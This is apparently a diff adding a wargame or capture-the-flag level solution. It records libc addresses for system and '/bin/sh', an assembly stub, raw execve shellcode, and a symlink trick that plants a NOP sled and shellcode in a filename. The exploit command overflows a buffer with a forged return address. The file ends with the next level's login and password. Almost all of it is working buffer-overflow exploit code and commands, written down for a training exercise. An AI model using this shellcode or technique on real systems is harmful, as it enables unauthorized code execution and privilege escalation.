@@ -1,0 +1,45 @@
+<address of system>
+
+	0x40058ae0
+
+</address of system>
+
+<address of "/bin/sh">
+
+	0x400fbff9
+
+</address of "/bin/sh">
+
+<shell.S>
+
+	.section .text
+	.globl _start
+	
+	_start:
+		push $0x400fbff9
+		call 0x40058ae0
+
+</shell.S>
+
+<shellcode>
+
+	\x31\xc0\x50\x68\xf9\xbf\x0f\x40\xb0\x0b\x8b\x1c\x24\x8d\x0c\x24\x31\xd2\xcd\x80
+
+</shellcode>
+
+<symlink>
+
+	ln -s troll "$(for x in `seq 1 64`; do printf "\x90"; done)$(printf "\x31\xc0\x50\x68\xf9\xbf\x0f\x40\xb0\x0b\x8b\x1c\x24\x8d\x0c\x24\x31\xd2\xcd\x80")"
+
+<symlink>
+
+<command>
+	./$(for x in `seq 1 64`; do printf "\x90"; done)$(printf "\x31\xc0\x50\x68\xf9\xbf\x0f\x40\xb0\x0b\x8b\x1c\x24\x8d\x0c\x24\x31\xd2\xcd\x80") "$(for x in `seq 1 44`; do printf "\x90"; done)$(printf "\xb0\xfa\xff\xbf")"
+</command>
+
+<next>
+
+	id: troll
+	pw: aspirin
+
+</next>
